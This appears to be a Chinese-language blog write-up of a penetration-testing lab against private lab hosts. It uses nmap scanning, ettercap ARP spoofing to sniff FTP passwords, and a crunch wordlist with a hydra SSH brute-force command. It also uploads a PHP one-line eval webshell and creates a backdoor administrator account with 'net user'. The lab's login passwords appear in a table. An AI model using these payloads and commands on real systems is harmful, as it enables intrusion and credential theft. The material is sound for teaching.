---
date: 2021-03-25
title: 网络侦察实验
#subtitle: 
categories: [渗透]
tags: [渗透]
---

# 网络侦察实验

### 实验背景

随着时代的发展和网络的普及，在世界各国、各层次的计算机网络中，储存着大量公开资料和机密资料，由于网络漏洞的存在，为“黑客”入侵计算机网络系统获取机密资料提供了很多便利，这些资料引起了各国军事情报部门的重视，都大力开展利用计算机网络系统来获取情报资料的研究和尝试，这便是网络侦察。

网络侦查是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标主机的所有探测活动。网络侦查有时也被称为“踩点”。通常“踩点”包括以下内容：目标主机的域名、IP地址、操作系统类型、开放了哪些端口，以及这些端口后面运行着什么样的应用程序，这些应用程序有没有漏洞等。那么如何收集信息呢？可以利用与技术无关的“社会工程学”、搜索引擎以及扫描工具。

本实验旨在通过在企业复杂网络场景下的网络侦查应用实战，让学生深刻理解网络侦查的概念、特性和原理，掌握网络侦查相关技术，具备对网络进行侦查、渗透、敏感信息获取以及防网络侦查的技术能力，这对于学生的信息安全技术能力提升、国家网络空间安全战略实施，都有非常重要的意义。

### 实验任务

任务一 使用nmap、ettercap进行网络侦查和密码嗅探；
任务二 使用crunch、hydra暴力破解ssh服务登陆密码；
任务三 使用ssh登录目标机，获得敏感信息；
任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息。

### 实验目的

* 了解网络侦查、信息收集、漏洞挖掘和利用的基本概念以及常用的信息收集和安全漏洞扫描工具，认知常见的网络侦查手段和企业网络安全漏洞。
* 掌握nmap工具的功能和操作方法，并能够分析检侧结果，能够运用这些工具解决目标网络信息探测、漏洞挖掘等常见的安全问题。
* 了解ettercap嗅探工具的基本功能，掌握常见的嗅探相关服务和应用的用户名和密码的方法。
* 了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。
* 了解hydra密码爆破工具的基本功能和使用方法，掌握常见的爆破服务和应用的用户名和密码的方法。
*  熟悉网站wenshell的概念，理解上传webshell、获取webshell权限的意义和方法，掌握获取webshell权限基础上控制目标机的方法。
* 通过nmap、ettercap、crunch和hydra等工具的学习和使用，能够融会贯通，掌握相关服务如ftp、web等漏洞挖掘、渗透、攻击和利用的原理和方法，掌握自主学习和实践主流企业网络扫描工具的功能、操作技巧、检测结果分析、网络侦查、漏洞挖掘的常用方法，具备企业复杂网络信息安全管理的职业能力和终身学习能力。

### 实验工具

+ Nmap（集成于kali linux）
+ ettercap（集成于kali linux）
+ crunch（集成于kali linux）
+ hydra（集成于kali linux）
+ Firefox（54.2.0）
+ Rdesktop

### 实验环境

| 操作系统    | IP地址      | 服务器角色 | 登录账户密码                              |
| ----------- | ----------- | ---------- | ----------------------------------------- |
| kali Linux  | 192.168.1.2 | 操作机     | 用户名：root；密码：Simplexue123          |
| CentOS7     | 192.168.1.3 | 目标机     | 用户名：root；密码：Simplexue123          |
| Windows2012 | 192.168.1.4 | 目标机     | 用户名：administrator；密码：Simplexue123 |

### 实验步骤

#### 任务一

1.扫描存活的主机

![image-20210325150711857](https://i.loli.net/2021/03/25/zPknCDVjpW3Jmlx.png)

2.使用嗅探工具对目标机的vsftpd服务进行嗅探。

通过设置监听网卡、主机、开启arp欺骗、启动嗅探等步骤来嗅探网络内的数据包，获取ftp用户名和密码。

![image-20210325152226044](https://i.loli.net/2021/03/25/zlgeGuf3kRQbNYM.png)

![image-20210325153309224](https://i.loli.net/2021/03/25/iZNCDe15ytPux4G.png)

#### 任务二

利用kali集成的crunch工具，生成密码字典文件。
使用hydra工具暴力破解ssh服务的登陆密码，以便完全控制目标主机系统。

使用命令`crunch 9 9 password.txt -p hacker+123456`生成密码

生成9位的数字字母组合，输出到password.txt文件

![image-20210325154745860](https://i.loli.net/2021/03/25/A9qhKSljfrw3dCU.png)

使用生成的密码字典进行爆破

```
hydra -L hacker.txt -P password.txt -t 1 -vV -e ns 192.168.1.3 ssh
```

破解得到密码：hacker123

#### 任务三

使用ssh登录目标机并获取key值，获得敏感信息

直接利用 爆破得到的密码进行登陆

ssh hacker@192.168.1.3

![image-20210325155633360](https://i.loli.net/2021/03/25/2nstiZqjApkCKHP.png)

![image-20210325155802866](https://i.loli.net/2021/03/25/Jmz6WETX9Q8jGPh.png)

ls -a命令列出文件：1.key

cat 1.key

ettercap

#### 任务四

获取目标网站的webshell权限，控制目标机，获得敏感信息

制作一句话木马和上传表单

```
<?php @eval($_POST['attack']) ?>
```

在浏览器另外一个页面快速打开`http://192.168.1.4/index.php?module=eventregistration&action=eventsCalendar`，获得时间戳，分析可知上传的文件名以时间戳+下划线+原文件名称来命名。

编写脚本并运行，获得上传的文件的URL路径。

![image-20210325183510613](https://i.loli.net/2021/03/25/RhfQO97VjGwEWia.png)

写入命令

`http://192.168.1.4/ tmp/1516041535_exp.php?cmd=system('' )`

添加新用户`net user hacker Beijing123 /add`

把hacker用户添加到管理员组，并远程连接目标机，远程连接的时候注意远程连接的端口。

以hacker用户（用户名：hacker、密码：Beijing123）身份登录目标机系统。

设置目标机C:\2.key文件的可读权限，并查看该文件的具体内容。
